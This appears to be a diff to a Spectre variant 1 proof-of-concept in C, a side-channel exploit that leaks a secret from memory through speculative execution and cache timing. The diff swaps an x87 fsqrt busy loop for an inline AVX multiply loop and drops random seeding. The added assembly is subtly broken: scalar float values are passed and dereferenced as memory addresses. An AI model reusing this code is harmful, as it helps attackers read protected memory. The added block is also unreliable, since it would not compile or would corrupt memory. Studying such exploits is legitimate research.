@@ -1,7 +1,6 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
-#include <time.h>
 #ifdef _MSC_VER
 #include <intrin.h> /* for rdtscp and clflush */
 #pragma optimize("gt", on)
@@ -43,6 +42,23 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
     size_t training_x, x;
     register uint64_t time1, time2;
     volatile uint8_t *addr;
+
+    float a = (float)(rand()) / (float)(rand());
+    float b = (float)(rand()) / (float)(rand());
+    float result;
+
+    for (int i = 0; i < 96; i += 8)
+    {
+        __asm__(
+            "vmovups (%0), %%ymm0\n\t"                // load vector a into ymm0
+            "vmovups (%1), %%ymm1\n\t"                // load vector b into ymm1
+            "vmulps %%ymm1, %%ymm0, %%ymm2\n\t"       // multiply ymm0 and ymm1, store result in ymm2
+            "vmovups %%ymm2, (%2)\n\t"                // store ymm2 into result
+            :                                         // no outputs
+            : "r"(a + i), "r"(b + i), "r"(result + i) // inputs
+            : "%ymm0", "%ymm1", "%ymm2", "memory"     // clobbered registers and memory
+        );
+    }
 
     for (i = 0; i < 256; i++)
         results[i] = 0;
@@ -100,22 +116,6 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2])
         }
         if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
             break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
-
-        float num = (float)(rand()) / (float)(rand());
-
-        for (i = 0; i < 3000; i++)
-        {
-            float result;
-
-            asm(
-                ".rept 30;"
-                "fld %1;"
-                "fsqrt;"
-                "fstp %0;"
-                ".endr;"
-                : "=m"(result)
-                : "m"(num));
-        }
     }
     results[0] ^= junk; /* use junk so code above won’t get optimized out*/
     value[0] = (uint8_t)j;
@@ -130,8 +130,6 @@ int main(int argc,
     size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
     int i, score[2], len = 40;
     uint8_t value[2];
-    // Seed the generator
-    srand(time(0));
 
     for (i = 0; i < sizeof(array2); i++)
         array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
